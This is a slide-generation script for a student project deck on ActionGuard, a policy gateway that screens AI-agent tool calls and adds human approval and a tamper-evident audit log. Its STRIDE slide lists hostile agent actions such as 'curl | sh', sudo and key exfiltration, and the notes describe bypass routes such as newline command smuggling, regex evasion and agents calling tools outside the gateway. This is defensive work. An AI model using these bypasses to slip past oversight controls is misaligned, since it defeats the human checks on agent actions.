    T(s, "Scripted demo run (--auto)", { x: 4.95, y: 1.8, w: 4.1, h: 0.32, fontSize: 14, bold: true, color: K.ink, align: "center" });
    s.addChart(pres.charts.DOUGHNUT, [{ name: "Outcome", labels: ["Allowed instantly (28)", "Held → approved (1)", "Held → rejected (2)", "Denied by policy (11)"], values: [28, 1, 2, 11] }],
      chartText({ x: 4.95, y: 2.1, w: 4.1, h: 3.65, showTitle: false, holeSize: 58, showValue: false, showPercent: false, showLegend: true, legendPos: "b",
        chartColors: [SEM.allow.bright, SEM.review.bright, SEM.review.dark, SEM.deny.bright], dataBorder: { pt: 1, color: "FFFFFF" }, objectName: nm("chart-outcomes") }));
    T(s, [{ text: "42", options: { fontFace: "Cambria", fontSize: 30, bold: true, color: K.ink, breakLine: true } }, { text: "actions", options: { fontSize: 12, color: K.muted } }],
      { x: 6.25, y: 2.95, w: 1.5, h: 0.85, align: "center", valign: "middle" });
    T(s, "6 / 6 scenarios behaved as expected", { x: 4.95, y: 5.85, w: 4.1, h: 0.32, fontSize: 14, bold: true, color: SEM.allow.dark, align: "center" });
    source(s, "python3 demo/run_demo.py --auto against the live gateway on :8700", 4.95, 6.2, 4.1, { extra: { align: "center" } });
    // latency
    box(s, 9.4, 1.8, 3.33, 3.3, { fill: HX.ink, radius: 0.1, name: "latency-card" });
    T(s, "< 0.2 ms", { x: 9.65, y: 1.95, w: 2.9, h: 0.85, fontFace: "Cambria", fontSize: 40, bold: true, color: K.teal, valign: "middle" });
    T(s, [{ text: "per policy decision (engine)", options: { breakLine: true } }, { text: "median 0.02–0.13 ms", options: { color: K.teal } }], { x: 9.65, y: 2.8, w: 2.9, h: 0.6, fontSize: 14, bold: true, color: K.white });
    T(s, "≈ 3 ms full SDK → HTTP → SQLite round trip", { x: 9.65, y: 3.45, w: 2.9, h: 0.55, fontSize: 13, color: HX.soft });
    T(s, "Apple M1 · Python 3.14 · 20-rule policy · 8 representative actions · engine only; HTTP and SQLite add to this", { x: 9.65, y: 4.05, w: 2.9, h: 0.9, fontSize: 10.5, color: HX.mutedDark });
    box(s, 9.4, 5.3, 3.33, 1.4, { fill: HX.light, radius: 0.08, name: "chain-card" });
    [["20 / 25", "calls allowed before the rate limit tripped"], ["6", "bypass/robustness defects found in code review → fixed + regression-tested"]].forEach(([big, t], i) => {
      const y = 5.4 + i * 0.62;
      T(s, big, { x: 9.6, y, w: 1.05, h: 0.55, fontFace: "Cambria", bold: true, fontSize: 20, color: K.ink, valign: "middle" });
      T(s, t, { x: 10.7, y, w: 1.95, h: 0.55, fontSize: 11, color: K.muted, valign: "middle" });
    });
    s.addNotes("We have 16 automated tests, and all 16 pass in under a second. Eleven test the engine directly, including known bypass attempts. Five start a real gateway on a random port and use the SDK: the approval flow, failing closed and tamper detection. A code review found six bypass and robustness defects, such as a newline smuggling a second shell command; all are fixed and regression-tested. In the scripted demo run, 42 actions gave 28 instant allows, 11 policy denials and 3 human reviews, exactly as expected. The engine decides in well under a fifth of a millisecond, and the full round trip through HTTP and the database is about three milliseconds on an M1 laptop. That is nothing next to an LLM call.");
  }

  // 19 ── Security analysis ─────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.eval, "04 · EVALUATION", "Security analysis: STRIDE and limits");
    const th = (t) => ({ text: t, options: { bold: true, color: K.white, fill: { color: HX.ink } } });
    const a = (t) => ({ text: t, options: { bold: true, color: K.ink } });
    const b = (t) => ({ text: t, options: { color: K.muted } });
    const c = (t) => ({ text: t, options: { color: K.ink } });
    const rows = [
      [th("Threat"), th("Example"), th("Mitigation in ActionGuard")],
      [a("Spoofing"), b("Agent approves its own request"), c("Admin calls need a Bearer token (constant-time compare); agents never hold it")],
      [a("Tampering"), b("Insider rewrites the audit DB"), c("SHA-256 hash chain; /v1/audit/verify names the broken entry")],
      [a("Repudiation"), b("“The bot did that, not me”"), c("Evaluations, approvals, lockdowns and reloads logged with who and when")],
      [a("Information disclosure"), b("Agent exfiltrates keys or PII"), c("Credential and secret-exfiltration deny rules; PII and unknown-domain flags")],
      [a("Denial of service"), b("Runaway loop, huge payload"), c("20 actions per 10 s per agent; 1 MB body cap; name validation")],
      [a("Elevation of privilege"), b("sudo, curl | sh, injected orders"), c("Deny and flag rules, human review, kill switch")],
    ];
    s.addTable(rows, { x: L, y: 1.8, w: 7.45, colW: [1.75, 2.25, 3.45], fontSize: 12, rowH: 0.66, valign: "middle",
      border: { type: "solid", pt: 0.75, color: HX.line }, margin: [3, 6, 3, 6], objectName: nm("stride-table") });
    box(s, 8.35, 1.8, 4.38, 4.95, { fill: SEM.review.tint, radius: 0.08, name: "limits-card" });
    await icon(s, "FaTriangleExclamation", SEM.review.dark, 8.6, 1.98, 0.36);
    T(s, "Honest limitations", { x: 9.1, y: 1.95, w: 3.4, h: 0.42, fontSize: 17, bold: true, color: SEM.review.dark, valign: "middle" });
    const lim = [
      ["Regex can be evaded", "Encodings, variables or aliases can slip past patterns; unknown actions default to review."],
      ["The SDK is cooperative", "An agent that calls tools directly bypasses it, so tools and their credentials must sit behind the gateway."],
      ["Per-process state", "Rate-limit window and lockdown flag live in memory: lost on restart, not shared across replicas."],
      ["Detects, doesn't prevent", "Anyone with DB write access can rebuild the whole chain; anchor the head hash externally."],
      ["Demo defaults", "Default admin token and plain HTTP on localhost; set a secret token and TLS in production."],
    ];
    lim.forEach(([h, d], i) => {
      const y = 2.5 + i * 0.84;
      T(s, [{ text: h, options: { bold: true, fontSize: 14, color: K.ink, breakLine: true } }, { text: d, options: { fontSize: 12, color: K.ink } }],
        { x: 8.6, y, w: 3.95, h: 0.8 });
    });
    s.addNotes("We analysed the gateway with STRIDE. An agent can't spoof an approver, because admin calls need a token the agent never has. Tampering is detected by the hash chain. Repudiation is covered because every decision records who made it. Data exfiltration is caught by secret and PII rules, runaway loops by the rate limit, and privilege escalation by deny rules and review. We also want to be honest about the limits. Regular expressions can be evaded. The SDK only works if tools actually sit behind the gateway. The rate limiter and the lockdown flag live in memory and are lost on restart. And the hash chain detects tampering but can't prevent it.");
  }

  // 20 ── Market scope ──────────────────────────────────────────────────────
  pres.addSection({ title: SEC.market });
  {
    const s = slide("CONTENT_LIGHT", SEC.market, "05 · MARKET & BUSINESS", "Market scope");
    s.addChart(pres.charts.BAR, [
      { name: "2025", labels: ["MarketsandMarkets", "BCC Research"], values: [7.84, 8.0] },
      { name: "2030 forecast", labels: ["MarketsandMarkets", "BCC Research"], values: [52.62, 48.3] },
    ], chartText({ x: L, y: 1.75, w: 4.6, h: 4.1, barDir: "col", barGapWidthPct: 60, title: "AI agents market (US$ billion)",
      chartColors: [HX.mutedDark, HX.tealD], showValue: true, dataLabelPosition: "outEnd", dataLabelFormatCode: '"$"0.00"B"',
      showLegend: true, legendPos: "b", valAxisHidden: true, valGridLine: { style: "none" }, catGridLine: { style: "none" }, objectName: nm("chart-agents") }));
    source(s, "Sources: MarketsandMarkets, Apr 2025 (46.3% CAGR); BCC Research, Jan 2026 (43.3% CAGR)", L, 5.92, 4.6, { h: 0.45 });
    s.addChart(pres.charts.BAR, [{ name: "AI TRiSM", labels: ["2026", "2031 forecast"], values: [3.09, 11.61] }],
      chartText({ x: 5.5, y: 1.75, w: 3.6, h: 4.1, barDir: "col", barGapWidthPct: 70, title: "AI TRiSM market (US$ billion)",
        chartColors: [HX.tealD], showValue: true, dataLabelPosition: "outEnd", dataLabelFormatCode: '"$"0.00"B"', showLegend: false,
        valAxisHidden: true, valGridLine: { style: "none" }, catGridLine: { style: "none" }, objectName: nm("chart-trism") }));
    source(s, "Source: MarketsandMarkets, Aug 2026 (30.3% CAGR; security and runtime control is the largest segment)", 5.5, 5.92, 3.6, { h: 0.45 });
    const st = [
      ["10–15%", "of agentic AI markets will be “guardian agent” tech (AI supervising AI) by 2030", "Source: Gartner, Jun 2025"],
      ["$182.9B", "AI agents market forecast for 2033 (49.6% CAGR, 2026–33)", "Source: Grand View Research, Jun 2026"],
      ["44%", "of organisations have policies to secure their AI agents", "Source: SailPoint, May 2025"],
    ];
    st.forEach(([big, t, src], i) => {
      const y = 1.75 + i * 1.45;
      if (i) s.addShape(pres.shapes.LINE, { x: 9.45, y: y - 0.12, w: R - 9.45, h: 0, line: { color: HX.line, width: 0.75 }, objectName: nm("sep") });
      T(s, big, { x: 9.45, y, w: 3.28, h: 0.5, fontFace: "Cambria", fontSize: 28, bold: true, color: K.tealD, valign: "middle" });
      T(s, t, { x: 9.45, y: y + 0.52, w: 3.28, h: 0.55, fontSize: 13, color: K.ink });
      source(s, src, 9.45, y + 1.07, 3.28);
    });
    T(s, "Analyst forecasts use different market definitions, so read them as ranges and never add them together.",
      { x: L, y: 6.45, w: CW, h: 0.3, fontSize: 12, italic: true, color: K.muted, valign: "middle" });
    s.addNotes("Now the market. Analysts expect the AI agents market to grow from about 8 billion dollars in 2025 to roughly 50 billion by 2030, a growth rate in the mid-forties. MarketsandMarkets and BCC give similar numbers. The security side is growing too: MarketsandMarkets puts AI trust, risk and security management at 3.1 billion this year, rising to 11.6 billion by 2031, with security and runtime control as the biggest segment. That's our category. Gartner also expects guardian agents, AI that supervises other AI, to take 10 to 15 percent of the agentic AI market by 2030. These forecasts use different definitions, so we treat them as ranges.");
  }

  // 21 ── Competitive landscape ─────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.market, "05 · MARKET & BUSINESS", "Competitive landscape");
    const th = (t, al) => ({ text: t, options: { bold: true, color: K.white, fill: { color: HX.ink }, align: al || "center" } });
    const yes = { text: "Yes", options: { bold: true, color: SEM.allow.dark, align: "center" } };
    const part = { text: "Partial", options: { color: SEM.review.dark, align: "center" } };
    const no = { text: "—", options: { color: K.muted, align: "center" } };
    const p = (t) => ({ text: t, options: { bold: true, color: K.ink } });
    const l = (t) => ({ text: t, options: { color: K.muted } });
    const rows = [
      [th("Product", "left"), th("Layer", "left"), th("Tool-call policy"), th("Human approval"), th("Tamper-evident audit")],
      [p("Lakera Guard"), l("Content"), no, no, no],
      [p("NVIDIA NeMo Guardrails"), l("Mostly content"), part, no, no],
      [p("Guardrails AI"), l("Content"), no, no, no],
      [p("Meta LlamaFirewall"), l("Content + reasoning"), no, no, no],
      [p("Protect AI / Prompt Security"), l("Posture, content, usage"), no, no, no],
      [p("Zenity"), l("Posture + partial action"), part, no, no],
      [p("Invariant Labs Gateway"), l("Action"), yes, no, no],
      [p("HumanLayer"), l("Action (approvals)"), no, yes, no],
    ];
    const ag = { fill: { color: HX.tealTint } };
    rows.push([{ text: "ActionGuard", options: { bold: true, color: K.tealD, ...ag } }, { text: "Action", options: { color: K.tealD, bold: true, ...ag } },
      { text: "Yes", options: { bold: true, color: SEM.allow.dark, align: "center", ...ag } }, { text: "Yes", options: { bold: true, color: SEM.allow.dark, align: "center", ...ag } },
      { text: "Yes", options: { bold: true, color: SEM.allow.dark, align: "center", ...ag } }]);
    s.addTable(rows, { x: L, y: 1.75, w: 7.95, colW: [2.45, 2.0, 1.15, 1.15, 1.2], fontSize: 12, rowH: 0.42, valign: "middle",
      border: { type: "solid", pt: 0.75, color: HX.line }, margin: [2, 6, 2, 6], objectName: nm("competitor-table") });
    source(s, "Based on public product descriptions in docs/research-notes.md §5; “—” means not a core capability in those sources.", L, 6.1, 7.95, { h: 0.4 });
    s.addChart(pres.charts.BAR, [{ name: "Deal value", labels: ["SentinelOne → Prompt Security", "F5 → CalypsoAI", "CrowdStrike → Pangea*", "Palo Alto → Protect AI"], values: [159.3, 180, 260, 634.5] }],
      chartText({ x: 8.85, y: 1.75, w: 3.88, h: 3.3, barDir: "bar", barGapWidthPct: 45, title: "Disclosed AI-security deals (US$ M)",
        chartColors: [HX.tealD], showValue: true, dataLabelPosition: "outEnd", dataLabelFormatCode: '"$"0.0"M"', showLegend: false,
        valAxisHidden: true, valGridLine: { style: "none" }, catGridLine: { style: "none" }, catAxisLabelFontSize: 10, valAxisMaxVal: 850, objectName: nm("chart-deals") }));
    T(s, [{ text: "Validation: ", options: { bold: true, color: K.tealD } },
      { text: "in Sep 2025 alone SentinelOne, Cato, F5, CrowdStrike and Check Point each bought an AI-security start-up. Snyk bought Invariant (Jun 2025); Cisco bought Astrix (Jun 2026).", options: { color: K.ink } }],
    { x: 8.85, y: 5.15, w: 3.88, h: 1.1, fontSize: 12 });
    source(s, "*reported. Sources: PANW 10-K; SentinelOne 10-Q; F5 PR; BankInfoSecurity", 8.85, 6.3, 3.88, { h: 0.4 });
    s.addNotes("Here's how we compare. Most products, including Lakera, Guardrails AI and LlamaFirewall, work at the content layer. NeMo Guardrails and Zenity have some action-level features. The closest peers are Invariant Labs, which enforces policy on tool calls, and HumanLayer, which adds human approvals. Our sources show no single product combining tool-call policy, human approval and a tamper-evident audit, and that combination is our differentiation. The market is clearly real. Palo Alto paid 634.5 million dollars for Protect AI, and in September 2025 alone five security companies bought AI-security start-ups. Big vendors are buying this capability, not building it.");
  }

  // 22 ── Business model ────────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.market, "05 · MARKET & BUSINESS", "Business model and target users");
    const tiers = [
      ["Community", "Free · open source", ["Gateway, policy engine and SDK", "Live dashboard", "Default policy packs", "Self-hosted, single node"], HX.light, K.ink, K.muted, K.tealD],
      ["Cloud console", "Paid subscription", ["Hosted, multi-tenant console", "SSO and role-based access", "Slack / Teams approvals", "Long-term audit retention"], HX.tealD, K.white, "D7F2EF", K.white],
      ["Enterprise", "Annual contract", ["Compliance reports (EU AI Act, ISO 42001)", "Managed, curated policy packs", "On-prem / VPC, SIEM export", "Support SLA"], HX.ink, K.white, HX.soft, K.teal],
    ];
    const w = (7.8 - 0.5) / 3;
    tiers.forEach(([name, tag, items, fill, tc, bc, accent], i) => {
      const x = L + i * (w + 0.25);
      box(s, x, 1.8, w, 4.9, { fill, radius: 0.1, name: "tier" });
      T(s, name, { x: x + 0.25, y: 2.0, w: w - 0.5, h: 0.45, fontSize: 20, bold: true, color: tc });
      T(s, tag, { x: x + 0.25, y: 2.45, w: w - 0.5, h: 0.32, fontSize: 13, bold: true, color: accent });
      T(s, items.map((t, j) => ({ text: t, options: { bullet: true, breakLine: j < items.length - 1 } })),
        { x: x + 0.25, y: 3.0, w: w - 0.45, h: 3.4, fontSize: 14, color: bc, paraSpaceAfter: 10 });
    });
    T(s, "Who buys it", { x: 8.75, y: 1.8, w: 3.98, h: 0.4, fontSize: 17, bold: true, color: K.ink, valign: "middle" });
    const seg = [
      ["FaMoneyBillTransfer", "Fintech and payments", "Agents that move money or touch card data"],
      ["FaLaptopCode", "Developer tools and DevOps", "Coding agents with shell, repo and cloud access"],
      ["FaBuilding", "Enterprises running agents", "Internal copilots acting on company data"],
      ["FaBuildingColumns", "Regulated industries", "BFSI, healthcare and the public sector, which need oversight evidence"],
    ];
    for (let i = 0; i < seg.length; i++) {
      const y = 2.35 + i * 1.1;
      await iconCircle(s, seg[i][0], 8.75, y + 0.05, 0.62, HX.tealTint, HX.tealD);
      T(s, [{ text: seg[i][1], options: { bold: true, fontSize: 15, color: K.ink, breakLine: true } }, { text: seg[i][2], options: { fontSize: 13, color: K.muted } }],
        { x: 9.55, y, w: 3.18, h: 0.95 });
    }
    s.addNotes("Our business model is open core. The community edition, with the gateway, engine, SDK and dashboard, stays free and open source. That builds trust, because security teams can read every line, and it drives adoption by developers. We'd charge for what larger organisations need: a hosted console with single sign-on, roles, and Slack or Teams approvals, and an enterprise tier with compliance reports, managed policy packs, on-premises deployment and support. The first buyers are fintech, developer-tool companies, enterprises running internal agents, and regulated industries that must show human oversight.");
  }

  // 23 ── Standards & compliance ────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.market, "05 · MARKET & BUSINESS", "Standards and compliance alignment");
    const cards = [
      ["FaListCheck", "OWASP Top 10 for LLM and Agentic Apps",
        "Excessive Agency (LLM06 → LLM03 in 2026): require human approval for high-impact actions and enforce authorization outside the LLM. Agentic list: ASI02 Tool Misuse, ASI03 Privilege Abuse, ASI05 Code Execution.",
        "Gateway policy + review queue. OWASP's Agent Control Standard v0.1 (Sep 2026) describes the same enforcement-point model."],
      ["FaLandmark", "NIST AI RMF 1.0",
        "Four functions: Govern, Map, Measure, Manage. NIST's AI Agent Standards Initiative (Feb 2026) adds agent security, identity and authorization.",
        "Govern: versioned policy, admin roles · Map: tools named in rules · Measure: risk scores · Manage: review, kill switch."],
      ["FaScaleBalanced", "EU AI Act, Article 14: human oversight",
        "People must be able to understand, override and stop high-risk systems. Annex III obligations apply from 2 Dec 2027 and Annex I from 2 Aug 2028 (Digital Omnibus, OJ 24 Jul 2026).",
        "Review queue to override, kill switch as the “stop” button, reasons shown for every verdict."],
      ["FaCertificate", "ISO/IEC 42001:2023",
        "The first certifiable AI management system standard (Dec 2023): documented controls backed by evidence.",
        "The policy file is a documented control; the hash-chained ledger is audit evidence."],
    ];
    const w = (CW - 0.3) / 2, h = 2.3;
    for (let i = 0; i < cards.length; i++) {
      const [ic, head, ask, ctl] = cards[i];
      const x = L + (i % 2) * (w + 0.3), y = 1.75 + Math.floor(i / 2) * (h + 0.2);
      box(s, x, y, w, h, { fill: HX.light, radius: 0.08, name: "standard-card" });
      await iconCircle(s, ic, x + 0.25, y + 0.2, 0.55, HX.ink, HX.teal);
      T(s, head, { x: x + 0.95, y: y + 0.2, w: w - 1.2, h: 0.55, fontSize: 17, bold: true, color: K.ink, valign: "middle" });
      T(s, ask, { x: x + 0.25, y: y + 0.85, w: w - 0.5, h: 0.85, fontSize: 12, color: K.muted });
      T(s, [{ text: "ActionGuard: ", options: { bold: true, color: K.tealD } }, { text: ctl, options: { color: K.ink } }],
        { x: x + 0.25, y: y + 1.68, w: w - 0.5, h: 0.55, fontSize: 12 });
    }
    source(s, "Sources: genai.owasp.org; nist.gov; ai-act-service-desk.ec.europa.eu, Sidley (Jun 2026), FPF; webstore.iec.ch", L, 6.68, CW);
    s.addNotes("ActionGuard also lines up with the major frameworks. OWASP's top mitigations for excessive agency are, almost word for word, human approval for high-impact actions and authorization outside the model. That's our review queue and our gateway. NIST's AI Risk Management Framework has four functions, and each maps to a feature. Article 14 of the EU AI Act requires that humans can override and stop high-risk systems. After the Digital Omnibus, those obligations apply from December 2027 for Annex III systems. Our review queue and kill switch are exactly those controls. And for ISO 42001, the audit chain provides the evidence.");
  }

  // 24 ── Future scope ──────────────────────────────────────────────────────
  pres.addSection({ title: SEC.wrap });
  {
    const s = slide("CONTENT_LIGHT", SEC.wrap, "06 · WRAP-UP", "Future scope");
    const cols = [
      ["FaRoute", "Enforcement", [["MCP proxy mode", "Transparent firewall in front of any MCP server, no SDK needed"], ["Sandboxed execution", "Run allowed tools in least-privilege containers"], ["Taint tracking", "Stricter rules for actions influenced by untrusted web or email content"]]],
      ["FaBrain", "Intelligence and policy", [["LLM risk classifier", "A second opinion on intent; may raise risk, never overrule a deny"], ["Policy-as-code", "Policy tests in CI and GitOps rollout with review"]]],
      ["FaServer", "Scale and operations", [["Postgres + Redis", "Shared state and rate limits for horizontal scale"], ["SSO, RBAC, multi-tenant", "Reviewer roles and per-team policies"], ["Slack / Teams approvals", "Approve where reviewers already work"]]],
      ["FaAnchor", "Trust and ecosystem", [["Anchored audit head", "Publish the head hash to a transparency log"], ["SIEM export", "OpenTelemetry events into existing security tools"], ["Framework plugins", "LangChain / LangGraph, CrewAI, OpenAI Agents SDK, Claude Agent SDK"]]],
    ];
    const w = (CW - 0.75) / 4;
    for (let i = 0; i < cols.length; i++) {
      const [ic, head, items] = cols[i], x = L + i * (w + 0.25);
      box(s, x, 1.8, w, 0.7, { fill: HX.ink, radius: 0.08, name: "theme-head" });
      await icon(s, ic, HX.teal, x + 0.2, 1.98, 0.34);
      T(s, head, { x: x + 0.65, y: 1.8, w: w - 0.8, h: 0.7, fontSize: 15, bold: true, color: K.white, valign: "middle" });
      items.forEach(([t, d], j) => {
        const y = 2.65 + j * 1.3;
        box(s, x, y, w, 1.18, { fill: HX.light, radius: 0.08, name: "future-item" });
        T(s, [{ text: t, options: { bold: true, fontSize: 14, color: K.ink, breakLine: true } }, { text: d, options: { fontSize: 12, color: K.muted } }],
          { x: x + 0.18, y: y + 0.1, w: w - 0.36, h: 1.0 });
      });
    }
    s.addNotes("There's a lot we'd like to build next, grouped into four themes. For enforcement, the biggest is an MCP proxy mode: a transparent firewall in front of any MCP server, so agents need no SDK at all. Sandboxed execution and taint tracking would follow. For intelligence, an LLM classifier could give a second opinion on intent, but it would only ever add risk, never override a deny. For scale, Postgres and Redis, single sign-on and Slack approvals. For trust, we'd anchor the audit head hash in a transparency log, export events through OpenTelemetry, and ship plugins for the popular agent frameworks.");
  }

  // 25 ── Conclusion ────────────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.wrap, "06 · WRAP-UP", "Conclusion");
    const tk = [
      ["Agents fail at the action layer", "Replit, Amazon Q, GitHub MCP and PocketOS all came down to one unchecked tool call. Prompt filters alone never see that moment.", "deny"],
      ["ActionGuard checks every tool call before it runs", "A declarative policy and risk score decide allow, review or deny in well under a millisecond. Humans approve the risky calls, and a hash chain proves what happened.", "review"],
      ["It fits where standards and the market are heading", "OWASP Excessive Agency, EU AI Act Article 14 and Gartner's guardian agents all point to runtime enforcement: an open-core product with clear buyers.", "allow"],
    ];
    tk.forEach(([h, d, kind], i) => {
      const y = 1.85 + i * 1.6;
      if (i) s.addShape(pres.shapes.LINE, { x: L, y: y - 0.15, w: CW, h: 0, line: { color: HX.line, width: 0.75 }, objectName: nm("sep") });
      T(s, String(i + 1), { x: L, y, w: 0.9, h: 1.2, fontFace: "Cambria", fontSize: 60, bold: true, color: SEM[kind].dark, valign: "middle" });
      T(s, h, { x: 1.7, y: y + 0.05, w: 9.3, h: 0.5, fontSize: 22, bold: true, color: K.ink, valign: "middle" });
      T(s, d, { x: 1.7, y: y + 0.58, w: 9.3, h: 0.75, fontSize: 15, color: K.muted });
      pill(s, kind, 11.5, y + 0.4, 1.23, 0.45, null, { size: 13 });
    });
    s.addNotes("To conclude, three takeaways. One: AI agents fail at the action layer. Every incident we showed came down to one tool call that nobody checked. Two: ActionGuard puts a fast, deterministic and explainable checkpoint in front of every tool call. It decides allow, review or deny in a fraction of a millisecond, brings in a human for the risky calls, and keeps tamper-evident proof. Three: this matches where the standards and the market are going, from OWASP and the EU AI Act to Gartner's guardian agents, so it can grow into a real open-core product.");
  }

  // 26 ── References ────────────────────────────────────────────────────────
  {
    const s = slide("CONTENT_LIGHT", SEC.wrap, "06 · WRAP-UP", "References");
    const refs = [
      "OWASP, Top 10 for LLM Applications 2025: LLM06 Excessive Agency. genai.owasp.org",
      "OWASP, Top 10 for LLM Applications 2026 (3 Aug 2026) and Agent Control Standard v0.1 (Sep 2026). genai.owasp.org; CSA research note, 4 Sep 2026",
      "OWASP, Top 10 for Agentic Applications 2026 (9 Dec 2025). genai.owasp.org",
      "NIST, AI Risk Management Framework 1.0 (AI 100-1), Jan 2023. nist.gov/itl/ai-risk-management-framework",
      "NIST CAISI, Strengthening AI agent hijacking evaluations, 17 Jan 2025 (upd. 19 Dec 2025); AI Agent Standards Initiative, 17 Feb 2026. nist.gov",
      "EU AI Act, Article 14 Human oversight. ai-act-service-desk.ec.europa.eu; timeline: Sidley Data Matters, 22 Jun 2026; Future of Privacy Forum",
      "ISO/IEC 42001:2023, AI management systems. webstore.iec.ch/publication/90574",
      "Gartner press releases: 11 Jun 2025 (guardian agents); 25 Jun 2025 (40% of agentic AI projects canceled, via W.Media); 26 Aug 2025 (40% of enterprise apps); 28 Apr 2026 (agent sprawl). gartner.com/en/newsroom",
      "SailPoint / Dimensional Research, AI agent security survey, BusinessWire, 28 May 2025",
      "Cisco, AI Readiness Index 2025, 14 Oct 2025. newsroom.cisco.com",
      "MarketsandMarkets, AI Agents Market (Apr 2025) and AI TRiSM Market (25 Aug 2026). marketsandmarkets.com",
      "BCC Research, AI agents market, 5 Jan 2026; Grand View Research, AI Agents Market Report, Jun 2026",
      "Incidents: TechTarget, 22 Jul 2025 (Replit); AWS bulletin AWS-2025-015, 23 Jul 2025 (Amazon Q); Invariant Labs, 26 May 2025 (GitHub MCP); BleepingComputer, 11 Jun 2025 (EchoLeak); ABC7, 30 Apr 2026 (PocketOS); Unit 42, 3 Mar 2026",
      "Deals: Palo Alto Networks FY25 10-K (Protect AI); SentinelOne 10-Q (Prompt Security); F5 press release, 11 Sep 2025; BankInfoSecurity (CrowdStrike–Pangea); Check Point press release (Lakera); SiliconANGLE, 24 Jun 2025 (Snyk–Invariant); Cisco blog (Astrix)",
    ];
    const half = 7;
    [refs.slice(0, half), refs.slice(half)].forEach((list, c) => {
      T(s, list.flatMap((t, i) => [
        { text: `[${c * half + i + 1}]  `, options: { bold: true, color: K.tealD } },
        { text: t, options: { breakLine: i < list.length - 1 } }]),
      { x: L + c * 6.2, y: 1.75, w: 5.9, h: 4.8, fontSize: 12, color: K.ink, paraSpaceAfter: 8 });
    });
    source(s, "Full URLs and publication dates: docs/research-notes.md in the project repository.", L, 6.6, CW);
    s.addNotes("These are our references. Every market figure, survey number and incident in this presentation comes from these sources. We compiled them in the research notes file in the repository, with full links and publication dates. Where Gartner's own pages couldn't be fetched automatically, we checked the figures against reputable reprints, and we left out any claim we couldn't verify against a primary source. The standards references are OWASP, NIST, the EU AI Act and ISO 42001.");
  }

  // 27 ── Thank you ─────────────────────────────────────────────────────────
  {
    const s = pres.addSlide({ masterName: "TITLE_DARK", sectionTitle: SEC.wrap });
    s.addText("Thank you", { placeholder: "title" });
    s.addText("Questions?", { placeholder: "subtitle" });
    pill(s, "allow", L, 4.05, 1.25, 0.42, null, { dark: true, size: 13 });
    pill(s, "review", L + 1.4, 4.05, 1.35, 0.42, null, { dark: true, size: 13 });
    pill(s, "deny", L + 2.9, 4.05, 1.15, 0.42, null, { dark: true, size: 13 });
    T(s, [
      { text: "Try it yourself", options: { bold: true, color: K.white, fontSize: 16, breakLine: true } },
      { text: "python3 -m actionguard", options: { fontFace: MONO, color: K.teal, fontSize: 15, breakLine: true } },
      { text: "python3 demo/run_demo.py", options: { fontFace: MONO, color: K.teal, fontSize: 15, breakLine: true } },
      { text: "<Student Name(s)> · Guide: <Guide Name>", options: { color: HX.soft, fontSize: 14 } },
    ], { x: L, y: 4.95, w: 7, h: 1.6, paraSpaceAfter: 4 });
    circle(s, 8.85, 1.75, 3.6, HX.panel, { line: HX.panelLine });
    await icon(s, "FaShieldHalved", HX.teal, 9.85, 2.75, 1.6);
    s.addNotes("Thank you for listening. To sum up in one sentence: ActionGuard lets AI agents be useful without being trusted blindly, because every action is checked, explained and recorded. The whole system runs with nothing but Python, so you can try it with the two commands shown here. We're happy to take your questions, and we can rerun any scenario of the demo live, show the policy file, or walk through the code.");
  }

  await pres.writeFile({ fileName: OUT });
  // apply_theme.js resolves pptxgenjs/jszip via NODE_PATH; point it at this folder's node_modules.
  process.env.NODE_PATH = path.join(__dirname, "node_modules");
  require("module").Module._initPaths();
  const { applyTheme } = require(path.join(SKILL, "scripts", "apply_theme.js"));
  await applyTheme(OUT, THEME);
  console.log("wrote", OUT);
}

build().catch((e) => { console.error(e); process.exit(1); });
